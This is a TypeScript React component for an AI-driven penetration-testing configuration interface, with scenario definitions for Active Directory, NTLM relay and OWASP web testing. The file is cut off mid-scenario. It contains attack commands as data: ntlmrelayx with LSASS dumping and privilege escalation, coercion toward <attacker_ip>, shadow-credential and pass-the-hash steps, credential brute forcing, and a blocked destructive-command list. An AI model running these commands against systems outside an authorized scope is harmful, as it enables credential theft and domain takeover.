/**
 * Enhanced Agentic Penetration Testing Interface
 * 
 * A production-ready penetration testing configuration interface that provides:
 * - Left Panel: Module Configuration & Selection
 * - Right Panel: Framework Selection, Tool Configuration & Aggression Settings
 * 
 * Features:
 * - Real-time configuration validation
 * - Backend-ready API structure
 * - Comprehensive security framework support
 * - Granular tool selection and configuration
 * - Aggression level management
 * - Export/Import configuration capabilities
 * 
 * @author Security Team
 * @version 2.0.0
 */

import React, { useState, useCallback, useEffect } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Switch } from "@/components/ui/switch";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Separator } from "@/components/ui/separator";
import { Slider } from "@/components/ui/slider";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Checkbox } from "@/components/ui/checkbox";
import { toast } from "@/hooks/use-toast";
import { 
  Shield, 
  Target, 
  Settings, 
  Zap, 
  AlertTriangle, 
  CheckCircle,
  Download,
  Upload,
  Play,
  Pause,
  RotateCcw,
  Network,
  Globe,
  Lock,
  Search,
  Code,
  Database,
  Bot,
  Terminal,
  Clock,
  TrendingUp,
  Save,
  FileText,
  Eye,
  Gauge,
  BookOpen
} from "lucide-react";

// ===========================
// TYPE DEFINITIONS
// ===========================

/**
 * Represents a penetration testing module configuration
 */
interface PentestModule {
  id: string;
  name: string;
  description: string;
  category: 'reconnaissance' | 'vulnerability-assessment' | 'exploitation' | 'post-exploitation' | 'reporting';
  enabled: boolean;
  priority: number;
  estimatedTime: string;
  requiredTools: string[];
  riskLevel: 'low' | 'medium' | 'high' | 'critical';
  prerequisites?: string[];
}

/**
 * Represents a phase in a penetration testing scenario
 */
interface PentestScenarioPhase {
  id: string;
  name: string;
  description: string;
  order: number;
  estimatedTime: string;
  riskLevel: 'low' | 'medium' | 'high' | 'critical';
  executionType: 'automatic' | 'manual' | 'dry-run' | 'gated';
  requiredTools: string[];
  commands?: string[];
  enabled: boolean;
  prerequisites?: string[];
}

/**
 * Represents a complete penetration testing scenario
 */
interface PentestScenario {
  id: string;
  name: string;
  description: string;
  category: 'web' | 'network' | 'active-directory' | 'cloud' | 'mobile' | 'iot';
  phases: PentestScenarioPhase[];
  enabled: boolean;
  estimatedTotalTime: string;
  riskLevel: 'low' | 'medium' | 'high' | 'critical';
  targetEnvironment: string;
}

/**
 * Security framework configuration options
 */
interface SecurityFramework {
  id: string;
  name: string;
  description: string;
  version: string;
  categories: string[];
  enabled: boolean;
  configuration: Record<string, any>;
}

/**
 * Individual tool configuration with detailed settings
 */
interface SecurityTool {
  id: string;
  name: string;
  version: string;
  category: 'network' | 'web' | 'ad' | 'osint' | 'mobile' | 'cloud' | 'social' | 'exploitation';
  description: string;
  enabled: boolean;
  aggressionLevel: number; // 1-5 scale
  timeout: number;
  retries: number;
  concurrent: boolean;
  customParams: Record<string, any>;
  riskLevel: 'low' | 'medium' | 'high' | 'critical';
  requiresConfirmation: boolean;
}

/**
 * Kali Linux MCP Server Configuration
 */
interface KaliMCPServerConfig {
  enabled: boolean;
  serverEndpoint: string;
  port: number;
  apiKey?: string;
  timeout: number;
  maxRetries: number;
  enabledTools: string[];
  resourceLimits: {
    maxConcurrentJobs: number;
    maxMemoryUsage: string;
    maxExecutionTime: number;
  };
  securitySettings: {
    sandboxMode: boolean;
    allowNetworkAccess: boolean;
    allowSystemCommands: boolean;
    blockedCommands: string[];
  };
}

/**
 * Guardrails Configuration
 */
interface GuardrailsConfig {
  enabled: boolean;
  mode: 'strict' | 'moderate' | 'permissive';
  approvalRequired: boolean;
  autoApproveLevel: 'safe' | 'low' | 'medium' | 'never';
  rules: {
    blockDestructiveCommands: boolean;
    requireConfirmationForHighRisk: boolean;
    validateTargetScope: boolean;
    preventDataExfiltration: boolean;
    limitResourceUsage: boolean;
  };
  customRules: string[];
  notifications: {
    alertOnBlocked: boolean;
    alertOnApprovalNeeded: boolean;
    emailNotifications: boolean;
    slackWebhook?: string;
  };
}

/**
 * Online Research Configuration
 */
interface OnlineResearchConfig {
  enabled: boolean;
  providers: {
    hacktricks: boolean;
    perplexity: boolean;
    shodan: boolean;
    cve: boolean;
    exploit_db: boolean;
  };
  apiKeys: {
    perplexityKey?: string;
    shodanKey?: string;
  };
  researchDepth: 'basic' | 'comprehensive' | 'deep';
  autoResearch: boolean;
  researchTriggers: string[];
}

/**
 * AI Agent/LLM configuration interface
 */
interface AIAgentConfiguration {
  model: string;
  fallbackModel: string;
  temperature: number;
  maxTokens: number;
  systemPrompt: string;
  enableReasoningMode: boolean;
  reasoningModel: string;
  customInstructions: string;
  responseFormat: 'json' | 'text' | 'structured';
  safetyLevel: 'low' | 'medium' | 'high';
  contextWindow: number;
  streamingEnabled: boolean;
  // Automation modes
  automationMode: 'fully_automatic' | 'human_approval' | 'manual';
  approvalThreshold: 'low' | 'medium' | 'high' | 'critical';
  // Local model configuration
  useLocalModel: boolean;
  localModelConfig: {
    apiEndpoint: string;
    port: number;
    modelName: string;
    apiKey?: string;
    timeout: number;
    maxRetries: number;
    provider: 'ollama' | 'lm-studio' | 'text-generation-webui' | 'custom';
  };
  // Kali MCP Server integration
  kaliMCPServer: KaliMCPServerConfig;
  // Guardrails configuration
  guardrails: GuardrailsConfig;
  // Online research configuration
  onlineResearch: OnlineResearchConfig;
  // HackTricks integration
  hackTricksIntegration: {
    enabled: boolean;
    autoLoadMethodology: boolean;
    preferredCategories: string[];
    updateFrequency: 'real-time' | 'daily' | 'weekly';
  };
  // System prompt presets
  systemPromptPreset: string;
  customSystemPrompts: Record<string, string>;
}

/**
 * Overall pentest configuration state
 */
interface PentestConfiguration {
  modules: PentestModule[];
  scenarios: PentestScenario[];
  frameworks: SecurityFramework[];
  tools: SecurityTool[];
  aiAgent: AIAgentConfiguration;
  globalSettings: {
    aggressionLevel: number;
    timeout: number;
    retries: number;
    concurrency: number;
    stealth: boolean;
    automated: boolean;
    reportingLevel: 'minimal' | 'standard' | 'comprehensive';
  };
  metadata: {
    name: string;
    description: string;
    target: string;
    scope: string;
    created: string;
    modified: string;
    ipRanges?: string;
    portRanges?: string;
    scanTechnique?: 'syn' | 'tcp' | 'udp' | 'ack' | 'comprehensive';
    aggressiveTiming?: boolean;
    serviceDetection?: boolean;
    osDetection?: boolean;
  };
}

// ===========================
// COMPONENT PROPS
// ===========================

interface EnhancedAgenticPentestInterfaceProps {
  onClose: () => void;
  onConfigurationChange?: (config: PentestConfiguration) => void;
  initialConfiguration?: Partial<PentestConfiguration>;
}

// ===========================
// MAIN COMPONENT
// ===========================

export const EnhancedAgenticPentestInterface: React.FC<EnhancedAgenticPentestInterfaceProps> = ({
  onClose,
  onConfigurationChange,
  initialConfiguration
}) => {
  // ===========================
  // STATE MANAGEMENT
  // ===========================

  const [configuration, setConfiguration] = useState<PentestConfiguration>({
    modules: [],
    scenarios: [],
    frameworks: [],
    tools: [],
    aiAgent: {
      model: 'gpt-5-2025-08-07',
      fallbackModel: 'gpt-4.1-2025-04-14',
      temperature: 0.2,
      maxTokens: 2000,
      systemPrompt: 'You are an expert AI cybersecurity agent specializing in penetration testing and vulnerability assessment. Provide detailed, actionable insights while maintaining ethical and legal compliance.',
      enableReasoningMode: false,
      reasoningModel: 'o4-mini-2025-04-16',
      customInstructions: '',
      responseFormat: 'structured',
      safetyLevel: 'high',
      contextWindow: 200000,
      streamingEnabled: true,
      automationMode: 'human_approval',
      approvalThreshold: 'medium',
      useLocalModel: false,
      localModelConfig: {
        apiEndpoint: 'http://localhost',
        port: 11434,
        modelName: 'llama2',
        timeout: 30000,
        maxRetries: 3,
        provider: 'ollama'
      },
      kaliMCPServer: {
        enabled: false,
        serverEndpoint: 'http://kali-mcp-server.local',
        port: 8080,
        timeout: 60000,
        maxRetries: 3,
        enabledTools: ['nmap', 'sqlmap', 'nikto', 'gobuster', 'nuclei'],
        resourceLimits: {
          maxConcurrentJobs: 5,
          maxMemoryUsage: '2GB',
          maxExecutionTime: 3600
        },
        securitySettings: {
          sandboxMode: true,
          allowNetworkAccess: true,
          allowSystemCommands: false,
          blockedCommands: ['rm -rf', 'dd', 'mkfs', 'fdisk']
        }
      },
      guardrails: {
        enabled: true,
        mode: 'moderate',
        approvalRequired: true,
        autoApproveLevel: 'safe',
        rules: {
          blockDestructiveCommands: true,
          requireConfirmationForHighRisk: true,
          validateTargetScope: true,
          preventDataExfiltration: true,
          limitResourceUsage: true
        },
        customRules: [],
        notifications: {
          alertOnBlocked: true,
          alertOnApprovalNeeded: true,
          emailNotifications: false
        }
      },
      onlineResearch: {
        enabled: true,
        providers: {
          hacktricks: true,
          perplexity: true,
          shodan: false,
          cve: true,
          exploit_db: true
        },
        apiKeys: {},
        researchDepth: 'comprehensive',
        autoResearch: true,
        researchTriggers: ['vulnerability_found', 'new_target', 'exploitation_failed']
      },
      hackTricksIntegration: {
        enabled: true,
        autoLoadMethodology: true,
        preferredCategories: ['web', 'network', 'active-directory', 'kubernetes'],
        updateFrequency: 'daily'
      },
      systemPromptPreset: 'pentest-expert',
      customSystemPrompts: {
        'pentest-expert': 'You are an expert AI cybersecurity agent specializing in penetration testing and vulnerability assessment. Provide detailed, actionable insights while maintaining ethical and legal compliance.',
        'red-team': 'You are an advanced red team operator with deep expertise in offensive security. Focus on creative attack vectors while ensuring all activities remain within legal boundaries.',
        'compliance-focused': 'You are a cybersecurity compliance expert conducting authorized security assessments. Prioritize documentation, risk classification, and regulatory alignment in all analyses.',
        'beginner-friendly': 'You are a patient cybersecurity mentor helping newcomers learn penetration testing. Explain concepts clearly, provide educational context, and emphasize safety practices.'
      }
    },
    globalSettings: {
      aggressionLevel: 3,
      timeout: 300,
      retries: 3,
      concurrency: 5,
      stealth: true,
      automated: false,
      reportingLevel: 'standard'
    },
    metadata: {
      name: 'New Pentest Configuration',
      description: '',
      target: '',
      scope: '',
      created: new Date().toISOString(),
      modified: new Date().toISOString(),
      ipRanges: '',
      portRanges: '1-1000',
      scanTechnique: 'syn',
      aggressiveTiming: false,
      serviceDetection: true,
      osDetection: false
    }
  });

  const [isRunning, setIsRunning] = useState(false);
  const [activeLeftTab, setActiveLeftTab] = useState('modules');
  const [activeRightTab, setActiveRightTab] = useState('frameworks');

  // ===========================
  // DEFAULT DATA INITIALIZATION
  // ===========================

  /**
   * Initialize default penetration testing modules
   */
  const initializeDefaultModules = useCallback((): PentestModule[] => [
    {
      id: 'recon-passive',
      name: 'Passive Reconnaissance',
      description: 'Gather information without directly interacting with the target',
      category: 'reconnaissance',
      enabled: true,
      priority: 1,
      estimatedTime: '15-30 min',
      requiredTools: ['subfinder', 'amass', 'shodan'],
      riskLevel: 'low'
    },
    {
      id: 'recon-active',
      name: 'Active Reconnaissance',
      description: 'Direct interaction with target systems for information gathering',
      category: 'reconnaissance',
      enabled: true,
      priority: 2,
      estimatedTime: '30-60 min',
      requiredTools: ['nmap', 'masscan', 'gobuster'],
      riskLevel: 'medium'
    },
    {
      id: 'vuln-scan',
      name: 'Vulnerability Scanning',
      description: 'Automated vulnerability detection and assessment',
      category: 'vulnerability-assessment',
      enabled: true,
      priority: 3,
      estimatedTime: '45-90 min',
      requiredTools: ['nuclei', 'nikto', 'openvas'],
      riskLevel: 'medium'
    },
    {
      id: 'web-exploit',
      name: 'Web Application Exploitation',
      description: 'Test web applications for security vulnerabilities',
      category: 'exploitation',
      enabled: false,
      priority: 4,
      estimatedTime: '60-120 min',
      requiredTools: ['burp', 'sqlmap', 'ffuf'],
      riskLevel: 'high',
      prerequisites: ['vuln-scan']
    },
    {
      id: 'ad-exploit',
      name: 'Active Directory Exploitation',
      description: 'Target Active Directory environments for privilege escalation',
      category: 'exploitation',
      enabled: false,
      priority: 5,
      estimatedTime: '90-180 min',
      requiredTools: ['bloodhound', 'crackmapexec', 'mimikatz'],
      riskLevel: 'critical',
      prerequisites: ['recon-active']
    },
    {
      id: 'post-exploit',
      name: 'Post-Exploitation',
      description: 'Maintain access and gather additional intelligence',
      category: 'post-exploitation',
      enabled: false,
      priority: 6,
      estimatedTime: '60-120 min',
      requiredTools: ['metasploit', 'cobalt-strike', 'empire'],
      riskLevel: 'critical',
      prerequisites: ['web-exploit', 'ad-exploit']
    }
  ], []);

  /**
   * Initialize default penetration testing scenarios
   */
  const initializeDefaultScenarios = useCallback((): PentestScenario[] => [
    {
      id: 'ad-comprehensive',
      name: 'Active Directory Comprehensive Assessment',
      description: 'Complete Active Directory security assessment from baseline discovery to privilege escalation',
      category: 'active-directory',
      enabled: true,
      estimatedTotalTime: '4-6 hours',
      riskLevel: 'critical',
      targetEnvironment: 'Windows Active Directory Domain',
      phases: [
        {
          id: 'baseline',
          name: 'Baseline',
          description: 'Establish baseline network and domain information',
          order: 1,
          estimatedTime: '15 min',
          riskLevel: 'low',
          executionType: 'automatic',
          requiredTools: ['nmap', 'ldapsearch'],
          enabled: true
        },
        {
          id: 'discovery',
          name: 'Discovery',
          description: 'Domain enumeration and service discovery',
          order: 2,
          estimatedTime: '20 min',
          riskLevel: 'low',
          executionType: 'automatic',
          requiredTools: ['enum4linux', 'rpcclient', 'smbclient'],
          enabled: true,
          prerequisites: ['baseline']
        },
        {
          id: 'kerberos',
          name: 'Kerberos (SPN/ASREP)',
          description: 'Kerberos service principal name and AS-REP roasting attacks',
          order: 3,
          estimatedTime: '30 min',
          riskLevel: 'medium',
          executionType: 'automatic',
          requiredTools: ['impacket', 'rubeus', 'bloodhound'],
          enabled: true,
          prerequisites: ['discovery']
        },
        {
          id: 'cred-hygiene',
          name: 'Cred Hygiene',
          description: 'Credential hygiene and password policy assessment',
          order: 4,
          estimatedTime: '25 min',
          riskLevel: 'medium',
          executionType: 'automatic',
          requiredTools: ['crackmapexec', 'ldapdomaindump'],
          enabled: true,
          prerequisites: ['kerberos']
        },
        {
          id: 'graph-acls',
          name: 'Graph & ACLs',
          description: 'Active Directory graph analysis and ACL enumeration',
          order: 5,
          estimatedTime: '35 min',
          riskLevel: 'medium',
          executionType: 'automatic',
          requiredTools: ['bloodhound', 'powerview', 'sharphound'],
          enabled: true,
          prerequisites: ['cred-hygiene']
        },
        {
          id: 'adcs',
          name: 'ADCS',
          description: 'Active Directory Certificate Services assessment',
          order: 6,
          estimatedTime: '40 min',
          riskLevel: 'high',
          executionType: 'automatic',
          requiredTools: ['certipy', 'certify'],
          enabled: true,
          prerequisites: ['graph-acls']
        },
        {
          id: 'local-admin-sessions',
          name: 'Local Admin & Sessions',
          description: 'Local administrator privileges and active sessions enumeration',
          order: 7,
          estimatedTime: '30 min',
          riskLevel: 'high',
          executionType: 'automatic',
          requiredTools: ['crackmapexec', 'netexec', 'bloodhound'],
          enabled: true,
          prerequisites: ['adcs']
        },
        {
          id: 'lateral-movement',
          name: 'Lateral Movement (check)',
          description: 'Lateral movement validation and path analysis',
          order: 8,
          estimatedTime: '45 min',
          riskLevel: 'high',
          executionType: 'manual',
          requiredTools: ['psexec', 'wmiexec', 'smbexec'],
          enabled: true,
          prerequisites: ['local-admin-sessions']
        },
        {
          id: 'priv-abuse',
          name: 'Priv Abuse (sim/dry-run)',
          description: 'Privilege abuse simulation and testing (dry-run only)',
          order: 9,
          estimatedTime: '30 min',
          riskLevel: 'critical',
          executionType: 'dry-run',
          requiredTools: ['powerview', 'aclpwn', 'dacledit'],
          enabled: true,
          prerequisites: ['lateral-movement']
        },
        {
          id: 'dcsync',
          name: 'DCSync (gated)',
          description: 'DCSync attack simulation with manual approval gates',
          order: 10,
          estimatedTime: '20 min',
          riskLevel: 'critical',
          executionType: 'gated',
          requiredTools: ['mimikatz', 'secretsdump'],
          enabled: true,
          prerequisites: ['priv-abuse']
        },
        {
          id: 'persistence',
          name: 'Persistence (dry-run)',
          description: 'Persistence mechanism identification (dry-run only)',
          order: 11,
          estimatedTime: '25 min',
          riskLevel: 'critical',
          executionType: 'dry-run',
          requiredTools: ['golden-ticket', 'skeleton-key'],
          enabled: true,
          prerequisites: ['dcsync']
        },
        {
          id: 'cleanup',
          name: 'Cleanup',
          description: 'Evidence removal and system cleanup',
          order: 12,
          estimatedTime: '15 min',
          riskLevel: 'low',
          executionType: 'automatic',
          requiredTools: ['custom-scripts'],
          enabled: true,
          prerequisites: ['persistence']
        },
        {
          id: 'verification',
          name: 'Verification',
          description: 'Verify cleanup and validate findings',
          order: 13,
          estimatedTime: '20 min',
          riskLevel: 'low',
          executionType: 'automatic',
          requiredTools: ['verification-scripts'],
          enabled: true,
          prerequisites: ['cleanup']
        },
        {
          id: 'report',
          name: 'Report',
          description: 'Generate comprehensive assessment report',
          order: 14,
          estimatedTime: '30 min',
          riskLevel: 'low',
          executionType: 'automatic',
          requiredTools: ['reporting-engine'],
          enabled: true,
          prerequisites: ['verification']
        }
      ]
    },
    {
      id: 'ntlm-relay-attack',
      name: 'NTLM Relay Attack Scenario',
      description: 'Comprehensive NTLM authentication relay attack simulation targeting Windows environments',
      category: 'active-directory',
      enabled: true,
      estimatedTotalTime: '2-3 hours',
      riskLevel: 'critical',
      targetEnvironment: 'Windows Domain Environment with SMB/HTTP services',
      phases: [
        {
          id: 'ntlm-recon',
          name: 'NTLM Reconnaissance',
          description: 'Identify SMB shares, HTTP services, and NTLM-enabled endpoints',
          order: 1,
          estimatedTime: '15 min',
          riskLevel: 'low',
          executionType: 'automatic',
          requiredTools: ['nmap', 'enum4linux', 'smbclient'],
          commands: [
            'nmap -p 445,139,80,443 --script smb-protocols,http-ntlm-info <target>',
            'enum4linux -a <target>',
            'smbclient -L //<target> -N'
          ],
          enabled: true
        },
        {
          id: 'ntlm-signing-check',
          name: 'SMB Signing Analysis',
          description: 'Check SMB signing requirements and identify vulnerable targets',
          order: 2,
          estimatedTime: '10 min',
          riskLevel: 'low',
          executionType: 'automatic',
          requiredTools: ['crackmapexec', 'nmap'],
          commands: [
            'crackmapexec smb <target_range> --gen-relay-list relay_targets.txt',
            'nmap --script smb-security-mode <target_range>'
          ],
          enabled: true,
          prerequisites: ['ntlm-recon']
        },
        {
          id: 'responder-setup',
          name: 'Responder Configuration',
          description: 'Configure Responder for NTLM hash capture and relay preparation',
          order: 3,
          estimatedTime: '5 min',
          riskLevel: 'medium',
          executionType: 'manual',
          requiredTools: ['responder', 'impacket'],
          commands: [
            'responder -I <interface> -wrPv',
            'echo "Configure /etc/responder/Responder.conf - disable SMB and HTTP servers for relay"'
          ],
          enabled: true,
          prerequisites: ['ntlm-signing-check']
        },
        {
          id: 'ntlm-relay-smb',
          name: 'SMB NTLM Relay Attack',
          description: 'Execute NTLM relay attack against SMB services without signing',
          order: 4,
          estimatedTime: '20 min',
          riskLevel: 'high',
          executionType: 'manual',
          requiredTools: ['impacket', 'ntlmrelayx'],
          commands: [
            'ntlmrelayx.py -tf relay_targets.txt -smb2support',
            'ntlmrelayx.py -tf relay_targets.txt -c "whoami"',
            'ntlmrelayx.py -tf relay_targets.txt --dump-lsass'
          ],
          enabled: true,
          prerequisites: ['responder-setup']
        },
        {
          id: 'ntlm-relay-ldap',
          name: 'LDAP NTLM Relay Attack',
          description: 'Relay NTLM authentication to LDAP for privilege escalation',
          order: 5,
          estimatedTime: '25 min',
          riskLevel: 'critical',
          executionType: 'gated',
          requiredTools: ['ntlmrelayx', 'ldap3'],
          commands: [
            'ntlmrelayx.py -t ldap://<dc_ip> --escalate-user <low_priv_user>',
            'ntlmrelayx.py -t ldaps://<dc_ip> --add-computer',
            'ntlmrelayx.py -t ldap://<dc_ip> --delegate-access'
          ],
          enabled: true,
          prerequisites: ['ntlm-relay-smb']
        },
        {
          id: 'http-ntlm-relay',
          name: 'HTTP to SMB Relay',
          description: 'Cross-protocol NTLM relay from HTTP to SMB services',
          order: 6,
          estimatedTime: '20 min',
          riskLevel: 'high',
          executionType: 'manual',
          requiredTools: ['ntlmrelayx', 'mitm6'],
          commands: [
            'mitm6 -d <domain>',
            'ntlmrelayx.py -6 -t smb://<target> -wh <attacker_ip>',
            'ntlmrelayx.py -t http://<target>/EWS/ -wh <attacker_ip>'
          ],
          enabled: true,
          prerequisites: ['ntlm-relay-ldap']
        },
        {
          id: 'ntlm-coercion',
          name: 'NTLM Authentication Coercion',
          description: 'Force NTLM authentication using various coercion techniques',
          order: 7,
          estimatedTime: '30 min',
          riskLevel: 'high',
          executionType: 'manual',
          requiredTools: ['petitpotam', 'printerbug', 'coercer'],
          commands: [
            'python3 PetitPotam.py <attacker_ip> <target_ip>',
            'python3 printerbug.py <domain>/<user>:<password>@<target> <attacker_ip>',
            'coercer coerce -t <target> -l <attacker_ip>'
          ],
          enabled: true,
          prerequisites: ['http-ntlm-relay']
        },
        {
          id: 'shadow-credentials',
          name: 'Shadow Credentials Attack',
          description: 'Exploit NTLM relay to add shadow credentials for persistence',
          order: 8,
          estimatedTime: '15 min',
          riskLevel: 'critical',
          executionType: 'gated',
          requiredTools: ['whisker', 'rubeus'],
          commands: [
            'Whisker.exe add /target:<target_computer>',
            'Rubeus.exe asktgt /user:<target_computer> /certificate:<cert> /password:<cert_password>',
            'Rubeus.exe s4u /ticket:<tgt> /impersonateuser:<target_user> /msdsspn:cifs/<target>'
          ],
          enabled: true,
          prerequisites: ['ntlm-coercion']
        },
        {
          id: 'relay-persistence',
          name: 'Relay-Based Persistence',
          description: 'Establish persistence using relayed credentials (dry-run)',
          order: 9,
          estimatedTime: '20 min',
          riskLevel: 'critical',
          executionType: 'dry-run',
          requiredTools: ['impacket-secretsdump', 'wmiexec'],
          commands: [
            'secretsdump.py <domain>/<user>:<password>@<target>',
            'wmiexec.py -hashes <lm>:<nt> <domain>/<user>@<target>',
            'echo "Create scheduled task for persistence (dry-run simulation)"'
          ],
          enabled: true,
          prerequisites: ['shadow-credentials']
        },
        {
          id: 'ntlm-mitigation-test',
          name: 'Mitigation Validation',
          description: 'Test NTLM relay mitigations and defensive measures',
          order: 10,
          estimatedTime: '15 min',
          riskLevel: 'low',
          executionType: 'automatic',
          requiredTools: ['nmap', 'crackmapexec'],
          commands: [
            'crackmapexec smb <target_range> --gen-relay-list post_mitigation.txt',
            'nmap --script smb-security-mode <target_range>',
            'echo "Compare pre/post mitigation relay targets"'
          ],
          enabled: true,
          prerequisites: ['relay-persistence']
        },
        {
          id: 'ntlm-cleanup',
          name: 'Attack Cleanup',
          description: 'Remove artifacts and restore normal operations',
          order: 11,
          estimatedTime: '10 min',
          riskLevel: 'low',
          executionType: 'automatic',
          requiredTools: ['custom-scripts'],
          commands: [
            'pkill -f responder',
            'pkill -f ntlmrelayx',
            'rm -f *.txt *.log responder.db'
          ],
          enabled: true,
          prerequisites: ['ntlm-mitigation-test']
        },
        {
          id: 'ntlm-report',
          name: 'NTLM Attack Report',
          description: 'Generate detailed NTLM relay attack assessment report',
          order: 12,
          estimatedTime: '20 min',
          riskLevel: 'low',
          executionType: 'automatic',
          requiredTools: ['reporting-engine'],
          enabled: true,
          prerequisites: ['ntlm-cleanup']
        }
      ]
    },
    {
      id: 'webapp-owasp-comprehensive',
      name: 'OWASP Web Application Security Assessment',
      description: 'Comprehensive web application security testing following OWASP Web Security Testing Guide (WSTG) methodology with automated and manual testing phases',
      category: 'web',
      enabled: true,
      estimatedTotalTime: '6-8 hours',
      riskLevel: 'critical',
      targetEnvironment: 'Web Application (Any Technology Stack)',
      phases: [
        {
          id: 'webapp-info-gathering',
          name: 'Information Gathering',
          description: 'Gather information about web application architecture, technologies, and attack surface mapping',
          order: 1,
          estimatedTime: '30 min',
          riskLevel: 'low',
          executionType: 'automatic',
          requiredTools: ['nmap', 'whatweb', 'wappalyzer', 'subfinder', 'httprobe'],
          commands: [
            'nmap -sS -sV -O -A --script=http-enum,http-headers,http-methods,http-title <target>',
            'whatweb -v -a 3 <target>',
            'subfinder -d <domain> | httprobe -c 50',
            'dirb <target> /usr/share/wordlists/dirb/common.txt'
          ],
          enabled: true
        },
        {
          id: 'webapp-config-deploy',
          name: 'Configuration & Deployment Testing',
          description: 'Test web server configuration, SSL/TLS setup, HTTP security headers, and deployment practices',
          order: 2,
          estimatedTime: '25 min',
          riskLevel: 'medium',
          executionType: 'automatic',
          requiredTools: ['testssl.sh', 'nikto', 'gobuster', 'curl'],
          commands: [
            'testssl.sh --full <target>',
            'nikto -h <target> -Tuning 1,2,3,4,5,6,7,8,9,0',
            'gobuster dir -u <target> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt',
            'curl -I <target> | grep -E "Server|X-|Cache|Content-Security-Policy"'
          ],
          enabled: true,
          prerequisites: ['webapp-info-gathering']
        },
        {
          id: 'webapp-identity-mgmt',
          name: 'Identity Management Testing',
          description: 'Test user registration, account provisioning, role definitions, and identity verification processes',
          order: 3,
          estimatedTime: '20 min',
          riskLevel: 'medium',
          executionType: 'manual',
          requiredTools: ['burp-suite', 'owasp-zap', 'custom-scripts'],
          commands: [
            'echo "Test user enumeration via registration forms"',
            'echo "Analyze role-based access controls and privilege definitions"',
            'echo "Check for account lockout policies and rate limiting"'
          ],
          enabled: true,
          prerequisites: ['webapp-config-deploy']
        },
        {
          id: 'webapp-authentication',
          name: 'Authentication Testing',
          description: 'Comprehensive authentication mechanism testing including brute force protection, credential transmission, and multi-factor authentication',
          order: 4,
          estimatedTime: '35 min',
          riskLevel: 'high',
          executionType: 'manual',
          requiredTools: ['hydra', 'medusa', 'burp-suite', 'owasp-zap'],
          commands: [
            'hydra -L userlist.txt -P passwords.txt <target> http-post-form "/login:username=^USER^&password=^PASS^:Failed"',
            'echo "Test for default credentials and weak passwords"',
            'echo "Analyze password reset and recovery mechanisms"',
            'echo "Test multi-factor authentication bypass techniques"'
          ],
          enabled: true,
          prerequisites: ['webapp-identity-mgmt']
        },
        {
          id: 'webapp-authorization',
          name: 'Authorization Testing',
          description: 'Test access controls, privilege escalation, and authorization bypass techniques across different user roles',
          order: 5,
          estimatedTime: '40 min',
          riskLevel: 'high',
          executionType: 'manual',
          requiredTools: ['burp-suite', 'authz-scanner', 'custom-scripts'],
          commands: [
            'echo "Test vertical privilege escalation (user to admin)"',
            'echo "Test horizontal privilege escalation (user to user)"',
            'echo "Analyze direct object references and access controls"',
            'echo "Test for insecure direct object references (IDOR)"'
          ],
          enabled: true,
          prerequisites: ['webapp-authentication']
        },
        {
          id: 'webapp-session-mgmt',
          name: 'Session Management Testing',
          description: 'Analyze session token generation, session fixation, session hijacking, and secure session handling',
          order: 6,
          estimatedTime: '30 min',
          riskLevel: 'high',
          executionType: 'manual',
          requiredTools: ['burp-suite', 'owasp-zap', 'custom-scripts'],
          commands: [
            'echo "Analyze session token entropy and predictability"',
            'echo "Test for session fixation vulnerabilities"',
            'echo "Check session timeout and invalidation mechanisms"',
            'echo "Test for concurrent session handling"'
          ],
          enabled: true,
          prerequisites: ['webapp-authorization']
        },
        {
          id: 'webapp-input-validation',
          name: 'Input Validation Testing',
          description: 'Comprehensive input validation testing including SQL injection, XSS, command injection, and file upload vulnerabilities',
          order: 7,
          estimatedTime: '45 min',
          riskLevel: 'critical',
          executionType: 'automatic',
          requiredTools: ['sqlmap', 'xsshunter', 'nuclei', 'burp-suite', 'commix'],
          commands: [
            'sqlmap -u "<target>?id=1" --batch --level=3 --risk=2',
            'nuclei -t /root/nuclei-templates/cves/ -t /root/nuclei-templates/vulnerabilities/ -u <target>',
            'echo "Test for reflected and stored XSS vulnerabilities"',
            'commix -u "<target>?cmd=test" --batch'
          ],
          enabled: true,
          prerequisites: ['webapp-session-mgmt']
        },
        {
          id: 'webapp-error-handling',
          name: 'Error Handling Testing',
          description: 'Test application error handling, information disclosure through errors, and exception management',
          order: 8,
          estimatedTime: '15 min',
          riskLevel: 'medium',
          executionType: 'automatic',
          requiredTools: ['burp-suite', 'custom-scripts', 'curl'],
          commands: [
            'curl -X POST <target> -d "malformed_data" -v',
            'curl <target>/nonexistent_page -v',
            'echo "Test database errors and stack traces"',
            'echo "Analyze custom error pages for information disclosure"'
          ],
          enabled: true,
          prerequisites: ['webapp-input-validation']
        },
        {
          id: 'webapp-cryptography',
          name: 'Cryptography Testing',
          description: 'Test encryption implementation, weak cryptographic algorithms, key management, and SSL/TLS security',
          order: 9,
          estimatedTime: '25 min',
          riskLevel: 'high',
          executionType: 'automatic',
          requiredTools: ['testssl.sh', 'sslscan', 'custom-scripts'],
          commands: [
            'testssl.sh --vulnerable --severity=HIGH <target>',
            'sslscan --show-certificate <target>',
            'echo "Test for weak encryption algorithms and ciphers"',
            'echo "Analyze certificate validation and pinning"'
          ],
          enabled: true,
          prerequisites: ['webapp-error-handling']
        },
        {
          id: 'webapp-business-logic',
          name: 'Business Logic Testing',
          description: 'Test application workflow manipulation, race conditions, and business rule bypass techniques',
          order: 10,
          estimatedTime: '35 min',
          riskLevel: 'high',
          executionType: 'manual',
          requiredTools: ['burp-suite', 'custom-scripts'],
          commands: [
            'echo "Test payment processing and transaction workflows"',
            'echo "Analyze multi-step process vulnerabilities"',
            'echo "Test for race conditions and timing attacks"',
            'echo "Check business rule enforcement and bypass techniques"'
          ],
          enabled: true,
          prerequisites: ['webapp-cryptography']
        },
        {
          id: 'webapp-client-side',
          name: 'Client-Side Testing',
          description: 'Test DOM-based vulnerabilities, client-side security controls, and browser-specific security issues',
          order: 11,
          estimatedTime: '30 min',
          riskLevel: 'medium',
          executionType: 'manual',
          requiredTools: ['burp-suite', 'dom-xss-scanner', 'browser-dev-tools'],
          commands: [
            'echo "Test for DOM-based XSS vulnerabilities"',
